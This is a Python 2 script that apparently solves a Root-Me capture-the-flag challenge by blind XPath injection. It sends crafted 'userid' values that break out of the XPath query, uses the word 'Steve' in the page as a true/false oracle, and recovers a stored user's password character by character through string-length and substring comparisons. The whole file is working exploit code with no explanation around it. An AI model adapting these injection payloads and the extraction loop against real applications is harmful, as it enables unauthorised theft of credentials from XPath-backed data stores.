import requests
length = 0
tmp = ''

for i in range(1,20):
	r=requests.get("http://challenge01.root-me.org/web-serveur/ch24/?action=user&userid=2222]+|+//user[1][userid=1+and+string-length(//user[2]/password)="+ str(i))
	tmp += str(i) + ' '
	print tmp
	if "Steve" in r.text:
		length = i
		break

for j in range(1, 14):
	flag = 0
	for line in range(1,6):
		if flag == 0 and (line == 1 or line == 3):
			for name in range(1,6):
				r = requests.get("http://challenge01.root-me.org/web-serveur/ch24/?action=user&userid=2222]+|+//user[1][userid=1+and+substring(//user[2]/password,"+str(j)+",1)=substring(//user["+str(line)+"]/username,"+str(name)+",1)")
				if "Steve" in r.text:
					print "Password[" + str(j)+"]: " + "u-" + str(line) + "-" + str(name)
					flag = 1
					break
		if flag == 0:
			for email in range(1,17):
				r = requests.get("http://challenge01.root-me.org/web-serveur/ch24/?action=user&userid=2222]+|+//user[1][userid=1+and+substring(//user[2]/password,"+str(j)+",1)=substring(//user["+str(line)+"]/email,"+str(email)+",1)")
				if "Steve" in r.text:
					print "Password[" + str(j)+"]: " + "e-" + str(line) + "-" + str(email)
					flag = 1
					break
		if flag == 0 and (line == 1 or line == 2):
			for account in range(1,13):
				r = requests.get("http://challenge01.root-me.org/web-serveur/ch24/?action=user&userid=2222]+|+//user[1][userid=1+and+substring(//user[2]/password,"+str(j)+",1)=substring(//user["+str(line)+"]/account,"+str(account)+",1)")
				if "Steve" in r.text:
					print "Password[" + str(j) +"]: " + "a-" + str(line) + "-" + str(account) 
					flag = 1
					break
		if flag == 1:
			break	
	if flag == 0:
		for p in range(0,10):
			r = requests.get("http://challenge01.root-me.org/web-serveur/ch24/?action=user&userid=2222]+|+//user[1][userid=1+and+substring(//user[2]/password,"+str(j)+",1)="+ str(p))
			if "Steve" in r.text:
				print "Password[" + str(j) + "]: " + str(p) 
				flag = 1
				break
	if flag == 0:
		print "Password[" + str(j) + "]: *"
		
